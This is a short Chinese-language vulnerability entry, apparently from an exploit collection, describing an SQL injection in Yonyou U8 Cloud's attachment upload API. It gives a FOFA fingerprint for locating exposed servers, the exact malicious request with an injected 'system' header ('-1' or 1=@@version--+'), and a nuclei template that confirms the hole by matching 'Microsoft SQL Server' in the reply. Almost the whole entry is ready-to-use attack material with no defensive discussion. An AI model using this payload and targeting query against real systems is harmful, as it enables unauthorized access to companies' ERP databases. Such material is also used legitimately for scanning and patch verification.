# 用友U8Cloud-mssql_error-SQL注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="用友-U8-Cloud"`
- **请求**：`GET /u8cloud/api/hr/attachment/upload?mssql_error HTTP/1.1`
- **关键头**：`Accept-Charset: utf-8`　`system: -1' or 1=@@version--+`

**请求体 / payload**
```
nueclei验证
id: yongyou_u8_cloud-attachment_upload-sqli
info:
name: yongyou_u8_cloud-attachment_upload-sqli
author: HackTwo
severity: high
description: 用友U8 Cloud /attachment/upload SQL注入漏洞
tags: yongyou,sqli
metadata:
fofa-query:
http:
- raw:
-
GET /u8cloud/api/hr/attachment/upload?mssql_error HTTP/1.1
Host:
Accept-Charset: utf-8
system: -1' or 1=@@version--+
matchers:
- type: dsl
name: sqli
dsl:
- (status_code==200 )  && contains(body, "Microsoft SQL Server")
```